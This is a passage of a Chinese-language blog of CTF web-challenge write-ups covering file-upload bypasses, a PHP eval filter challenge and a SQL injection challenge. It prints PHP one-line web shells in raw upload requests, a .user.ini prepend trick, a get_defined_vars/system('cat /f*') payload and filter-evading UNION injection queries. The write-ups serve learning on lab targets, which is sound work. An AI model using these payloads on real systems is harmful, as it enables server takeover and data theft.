表示禁止访问</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-variable">$file_name</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件上传成功！&#x27;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>                    <span class="hljs-variable">$status_code</span> = <span class="hljs-number">500</span>; <span class="hljs-comment">// 500 表示服务器内部错误</span><br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>            <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>        <span class="hljs-variable">$status_code</span> = <span class="hljs-number">404</span>; <span class="hljs-comment">// 404 表示资源未找到</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 设置 HTTP 状态码</span><br><span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-variable">$status_code</span>);<br><br><span class="hljs-comment">// 输出结果</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>    <span class="hljs-string">&#x27;status_code&#x27;</span> =&gt; <span class="hljs-variable">$status_code</span>,<br>    <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-variable">$msg</span>,<br>]);<br></code></pre></td></tr></table></figure><p>经测试，uploads&#x2F;index.php<br>回显：<br>File not found.  </p><p>并没有404<br>那应该就能用.user.ini的办法  </p><p>上传  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:62381<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>331<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryMjahAHXakvDQQiYS<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryMjahAHXakvDQQiYS</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;name&quot;; filename=&quot;shell.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryMjahAHXakvDQQiYS</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">上传文件</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryMjahAHXakvDQQiYS--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><p>回显：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Thu, 08 May 2025 09:24:17 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/7.3.26<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>70<br><br><span class="language-nix">&#123;<span class="hljs-string">&quot;status_code&quot;</span>:<span class="hljs-number">200</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>6587<span class="hljs-char escape_">\u</span>4ef6<span class="hljs-char escape_">\u</span>4e0a<span class="hljs-char escape_">\u</span>4f20<span class="hljs-char escape_">\u</span>6210<span class="hljs-char escape_">\u</span>529f<span class="hljs-char escape_">\u</span>ff01&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure><p>解码后的意思就是成功<br>文件上传成功！<br>访问<br>&#x2F;uploads&#x2F;shell.jpg<br>访问成功！  </p><p>然后接下来传.user.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span> = shell.jpg<br></code></pre></td></tr></table></figure><p>上传成功<br>接下来用蚂蚁连<br>&#x2F;uploads&#x2F;index.php<br>失败？  </p><p>不对，竟然不用  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script&gt;包裹，那应该也不用&lt;script&gt;头了<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);<br></code></pre></td></tr></table></figure><p>也不行，<br>实在没办法了，去看wp，<br>说是在源码里知道能用name参数来进行目录穿越？  </p><p>直接传  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php?name=shell.php/.</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:50404<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>323<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50404<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryDxKYmUwl8LfJkYfi<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50404/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-php">------WebKitFormBoundaryDxKYmUwl8LfJkYfi</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;name&quot;</span>; filename=<span class="hljs-string">&quot;hello.jpg&quot;</span></span><br><span class="language-php">Content-Type: image/jpg</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php">------WebKitFormBoundaryDxKYmUwl8LfJkYfi</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">上传文件</span><br><span class="language-php">------WebKitFormBoundaryDxKYmUwl8LfJkYfi--</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>尽然就成功传进去了？<br>这个是什么构造法？什么原理？<br>&#x2F;upload.php?name&#x3D;hello.php&#x2F;.   </p><p>然后蚂蚁直接连<br>&#x2F;uploads&#x2F;shell.php<br>然后用蚂蚁的终端看环境<br>env<br>看到flag</p><p>原理是啥，怎么绕过的？</p><p>deepseek:  </p><blockquote><p>漏洞点：当攻击者通过GET参数name&#x3D;shell.php&#x2F;.传递文件名时，pathinfo()解析扩展名的行为异常。<br>pathinfo(‘shell.php&#x2F;.’, PATHINFO_EXTENSION)会返回空值，因为末尾的&#x2F;.被识别为目录结构而非文件扩展名。<br>黑名单检查$deny_ext因此误判文件类型合法，绕过防护。  </p></blockquote><p>反正我在kali里<br>echo 114514 &gt; sunxiaochuan258.txt&#x2F;.是无法执行的  </p><p>那可能就是误判文件类型了</p><p>当然，刚才是烧一点的做法，正常的做法是<br>利用name参数来进行目录穿越，然后在index.php主目录下上传shell.jpg和.user.ini</p><p>这题也是学到不少</p><h1 id="TGCTF-AAA偷渡阴平"><a href="#TGCTF-AAA偷渡阴平" class="headerlink" title="TGCTF AAA偷渡阴平"></a>TGCTF AAA偷渡阴平</h1><p>据说是web签到<br>开题拿到源码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$tgctf2025</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tgctf2025&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$tgctf2025</span>))&#123;<br>    <span class="hljs-comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tgctf2025</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>?tgctf2025&#x3D;system(ls);<br>&#x2F;&#x2F;Warning: Use of undefined constant ls - assumed ‘ls’ (this will throw an Error in a future version of PHP) in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php(8) : eval()’d code on line 1<br>index.php</p><p>看wp得到payload<br>?tgctf2025&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;system(‘cat &#x2F;f*’);<br>不明白<br>问问ai  </p><h2 id="kimi"><a href="#kimi" class="headerlink" title="kimi:  "></a>kimi:  </h2><p>该 PHP 脚本存在代码注入漏洞，以下是对 payload 的解释：  </p><p>?tgctf2025&#x3D;eval(end(current(get_defined_vars()))); ：  </p><p>get_defined_vars() 返回一个包含所有已定义变量的数组，包括全局变量和局部变量。  </p><p>current() 函数取得数组中的当前元素，这里会得到数组的第一个元素，通常是 GLOBALS 数组。  </p><p>end() 函数将数组的内部指针指向最后一条记录并返回该记录，此处作用于 current(get_defined_vars()) 的返回值，即 GLOBALS 数组，所以会指向 GLOBALS 数组的最后一个元素。    </p><p>但在这段代码中，由于 get_defined_vars() 返回的是所有变量数组，而我们是先用 current() 取第一个元素（即 GLOBALS 数组），再用 end() 将其指针移到最后一个元素，但这对于绕过正则过滤和执行命令来说，并非关键，真正关键的是后续如何利用 b 参数来实现命令执行。    </p><p>eval() 函数会对传入的字符串作为 PHP 代码进行解析和执行，将 end(current(get_defined_vars())) 的结果传递给 eval，但此处关键不在于这个 eval 的内容，而在于后面的参数是如何被利用的。  </p><p>&amp;b&#x3D;system(‘cat &#x2F;f*’); ：  </p><p>这里通过 GET 请求传递了一个 b 参数，其值为 system(‘cat &#x2F;f*’);。  </p><p>在 PHP 中，system() 函数用于执行外部程序，并且会输出结果。  </p><p>‘cat &#x2F;f*’ 是一个 Linux 系统命令，cat 用于输出文件内容，&#x2F;f* 是匹配以 &#x2F;f 开头的所有文件，通常在一些 CTF（Capture The Flag）题目中，可能存在 &#x2F;flag.txt 或类似路径的文件存放着标志（flag），所以这个命令意图读取这样的文件内容。  </p><p>结合整个 payload 来看，由于脚本中未对 tgctf2025 参数的有效字符进行严格限制，正则表达式存在漏洞，攻击者可以构造特殊的 PHP 代码并通过 eval 执行，从而实现命令执行等恶意操作，这里的 payload 利用了 get_defined_vars() 来获取变量并结合 b 参数中的 system 函数调用，试图读取服务器上的敏感文件内容，但实际能否成功还取决于服务器环境等其他因素，例如是否允许 system 函数执行等。  </p><p>deepseek:<br>步骤 1：获取所有变量<br>get_defined_vars() 返回当前作用域内的所有变量，包括超全局数组 $_GET。此时，$_GET 包含：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span> = [<br>    <span class="hljs-string">&#x27;tgctf2025&#x27;</span> =&gt; <span class="hljs-string">&#x27;eval(end(current(get_defined_vars())));&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span><br>];<br></code></pre></td></tr></table></figure><p>步骤 2：提取 $_GET 数组<br>current(get_defined_vars())：current() 返回数组的第一个元素。由于 $_GET 是超全局变量，它在返回的数组中通常位于前列，因此这里获取到 $_GET 数组。  </p><p>end(current(…))：将 $_GET 的内部指针移动到末尾（即参数 b），并返回其值 system(‘cat &#x2F;f*’);。  </p><p>步骤 3：执行命令</p><p>eval(end(current(get_defined_vars()))) 最终执行 system(‘cat &#x2F;f*’);，读取服务器上的 &#x2F;f* 文件（如 &#x2F;flag）。  </p><p>&#x2F;&#x2F; </p><p>我的理解就是：    </p><p>?tgctf2025&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;system(‘cat &#x2F;f*’);<br>先新建一个eval函数<br>然后get_defined_vars()用来返回所有定义的变量，包含全局的非全局的,这两类会被分为两个数组，<br>在用current()选择get_defined_vars()生成的数组中的第一个，因为$_GET为超全局变量，所以会在返回的第一个，而此时get中有两个变量，’tgctf2025’ 和 ‘b’<br>再用end来选取全局变量组成的数组中的最后一个元素，即为b</p><p>然后用最外第二层的eval函数来执行变量$b,<br>而源码中的第一层eval 就是用来执行这两段操作的，相当于我们上传了两段代码  </p><h1 id="SWPUCTF-2021-新生赛-sql"><a href="#SWPUCTF-2021-新生赛-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]sql"></a>[SWPUCTF 2021 新生赛]sql</h1><p>按f12 看到标题提示参数是wllm<br>传一个wllm&#x3D;1看看，这熟悉的绿字，感觉回到了sql-labs<br>再传个2，不回显<br>那简单fuzz一下  </p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs excel">过滤了：<br>空格 <br>+<br>=<br><span class="hljs-built_in">and</span><br>updatexml<br>extr<br>extractvalue<br><br><span class="hljs-number">0</span>&#x27;<span class="hljs-built_in">or</span>%<span class="hljs-number">0</span>aunion%<span class="hljs-number">0</span>aselect%<span class="hljs-number">0</span>a1,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>好嘛，试了好久原来是#它不自己进行url编码  </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%27</span>order<span class="hljs-variable">%0</span>aby<span class="hljs-variable">%0</span>a<span class="hljs-number">3</span><span class="hljs-variable">%23</span><br>测出回显列为<span class="hljs-number">3</span>  <br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span><br><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>database()<span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>group_concat(table_name)from(information_schema.tables)<span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span><br><br>/?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)from(information_schema.tables)<span class="hljs-variable">%23</span><br>Your Password:ALL_PLUGINS<span class="hljs-punctuation">,</span>APPLICAB<br>//不是，我用第二行回显甚至会报错？什么题目环境<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)from(information_schema.tables)where(table_schema)like(database())<span class="hljs-variable">%23</span><br>Your Password:LTLT_flag<span class="hljs-punctuation">,</span>users<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(column_name)from(information_schema.columns)where(table_name)like(&#x27;LTLT_flag&#x27;)<span class="hljs-variable">%23</span><br>Your Password:id<span class="hljs-punctuation">,</span>flag<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(flag)from(LTLT_flag)<span class="hljs-variable">%23</span><br>NSSCTF&#123;<span class="hljs-number">48</span>f<span class="hljs-number">21</span>b<span class="hljs-number">19</span>-<span class="hljs-keyword">c</span><span class="hljs-number">67</span>b<br>只得到一半<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>(group_concat(flag)from(LTLT_flag))<span class="hljs-variable">%23</span><br>试了一下  <br>reverse，<br>left<br>都不能用<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>mid(group_concat(flag)<span class="hljs-punctuation">,</span><span class="hljs-number">20</span><span class="hljs-punctuation">,</span><span class="hljs-number">40</span>)from(LTLT_flag)<span class="hljs-variable">%23</span><br>mid函数试了好久，看wp才知道正确用法😫<br>b<span class="hljs-number">-47</span>a<span class="hljs-number">5</span><span class="hljs-number">-8</span>cdf<span class="hljs-number">-17841</span>a<span class="hljs-number">4</span>e<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>mid(group_concat(flag)<span class="hljs-punctuation">,</span><span class="hljs-number">40</span><span class="hljs-punctuation">,</span><span class="hljs-number">60</span>)from(LTLT_flag)<span class="hljs-variable">%23</span><br>ca<span class="hljs-number">1</span><span class="hljs-keyword">c</span>&#125;<br><br>NSSCTF&#123;<span class="hljs-number">48</span>f<span class="hljs-number">21</span>b<span class="hljs-number">19</span>-<span class="hljs-keyword">c</span><span class="hljs-number">67</span>b<span class="hljs-number">-47</span>a<span class="hljs-number">5</span><span class="hljs-number">-8</span>cdf<span class="hljs-number">-17841</span>a<span class="hljs-number">4</span>eca<span class="hljs-number">1</span><span class="hljs-keyword">c</span>&#125;<br></code></pre></td></tr></table></figure><p>总结，不能小看啊，太久不做容易在小地方犯错，比如url编码，mid函数使用,幸好大方向是对的，给一个安心看别人wp得理由啊啊🤣</p><h1 id="MoeCTF-垫刀之路01-MoeCTF？启动！"><a href="#MoeCTF-垫刀之路01-MoeCTF？启动！" class="headerlink" title="MoeCTF 垫刀之路01: MoeCTF？启动！"></a>MoeCTF 垫刀之路01: MoeCTF？启动！</h1><p>ls &#x2F; 查看根目录  </p><p>cat &#x2F;flag<br>提示flag不在这，去看系统环境  </p><p>env<br>拿到flag</p><h1 id="MoeCTF-垫刀之路02-普通的文件上传"><a href="#MoeCTF-垫刀之路02-普通的文件上传" class="headerlink" title="MoeCTF 垫刀之路02: 普通的文件上传"></a>MoeCTF 垫刀之路02: 普通的文件上传</h1><p>直接传php马  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);<br></code></pre></td></tr></table></figure><p>然后用蚂蚁连或者直接post一个env就能看到flag</p><h1 id="MoeCTF-垫刀之路03-这是一个图床"><a href="#MoeCTF-垫刀之路03-这是一个图床" class="headerlink" title="MoeCTF 垫刀之路03: 这是一个图床"></a>MoeCTF 垫刀之路03: 这是一个图床</h1><p>只在前端做了限制，改前端代码或者bp抓包传就行</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span 